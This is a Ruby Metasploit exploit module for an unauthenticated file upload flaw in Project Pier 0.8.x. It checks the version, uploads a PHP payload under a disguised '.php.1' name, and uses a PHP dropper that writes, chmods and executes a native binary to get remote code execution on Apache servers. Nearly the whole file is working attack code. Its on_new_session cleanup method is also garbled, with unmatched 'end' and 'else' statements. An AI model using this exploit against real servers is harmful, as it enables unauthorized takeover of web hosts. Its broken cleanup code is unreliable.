# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Project Pier Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Project Pier.  The application&#039;s
        uploading tool does not require any authentication, which allows a malicious user
        to upload an arbitrary file onto the web server, and then cause remote code
        execution by simply requesting it. This module is known to work against Apache
        servers due to the way it handles an extension name, but the vulnerability may
        not be exploitable on others.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;BlackHawk&#039;,
          &#039;sinn3r&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;85881&#039;],
          [&#039;URL&#039;, &#039;http://packetstormsecurity.org/files/117070/ProjectPier-0.8.8-Shell-Upload.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;php&#039;],
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
          [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 8 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/pp088/&#039;])
      ], self.class)
  end


  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    res = send_request_cgi(
      {
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}/index.php",
        &#039;vars_get&#039; =>
          {
            &#039;c&#039; => &#039;access&#039;,
            &#039;a&#039; => &#039;login&#039;
          }
      })

    if res and res.body =~ /Welcome to ProjectPier 0\.8\.[0-8]/ and res.headers[&#039;Server&#039;] =~ /^Apache/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def get_write_exec_payload(fname, data)
    p = Rex::Text.encode_base64(generate_payload_exe)
    php = %Q|
    <?php
    $f = fopen("#{fname}", "wb");
    fwrite($f, base64_decode("#{p}"));
    fclose($f);
    exec("chmod 777 #{fname}");
    exec("#{fname}");
    ?>
    |
    php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
    return php
  end

  def on_new_session(cli)
      cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
    end

    @clean_files.each do |f|
      print_debug("#{@peer} - Removing: #{f}")
      begin
          cli.fs.file.rm(f)
        else
          cli.shell_command_token("rm #{f}")
        end
        print_debug("File removed: #{f}")
      rescue ::Exception => e
        print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
      end
    end
  end

  def upload_php(base, fname, php_payload, folder_name)
    data = Rex::MIME::Message.new
    data.add_part(folder_name, nil, nil, &#039;form-data; name="folder"&#039;)
    data.add_part(php_payload, nil, nil, "form-data; name=file; filename=\"#{fname}\"")
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="part"&#039;)
    data.add_part(&#039;Submit&#039;, nil, nil, &#039;form-data; name="submit"&#039;)

    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{base}/tools/upload_file.php",
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    => post_data
    })

    return res.body if res
  end

  def exec_php(base, body)
    # Body example:
    # 0 ./upload/test/test.txt-0001
    uri = body.scan(/(\/.+$)/).flatten[0]
    @clean_files << File.basename(uri)

    res = send_request_raw({&#039;uri&#039; => "#{base}/tools#{uri}"})

    if res and res.code == 404
      print_error("#{@peer} - The upload most likely failed")
      return
    end

    handler
  end

  def exploit
    @peer = "#{rhost}:#{rport}"

    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    folder_name = Rex::Text.rand_text_alpha(4)
    php_fname = "#{Rex::Text.rand_text_alpha(5)}.php.1"
    @clean_files = []

    case target[&#039;Platform&#039;]
    when &#039;php&#039;
      p = "<?php #{payload.encoded} ?>"
    when &#039;linux&#039;
      bin_name = "#{Rex::Text.rand_text_alpha(5)}.bin"
      @clean_files << bin_name
      bin = generate_payload_exe
      p = get_write_exec_payload("/tmp/#{bin_name}", bin)
    end

    print_status("#{@peer} - Uploading PHP payload (#{p.length.to_s} bytes)...")
    res = upload_php(base, php_fname, p, folder_name)

    if not res
      print_error("#{@peer} - No response from server")
      return
    end

    print_status("#{@peer} - Executing &#039;#{php_fname}&#039;...")
    exec_php(base, res)
  end
end



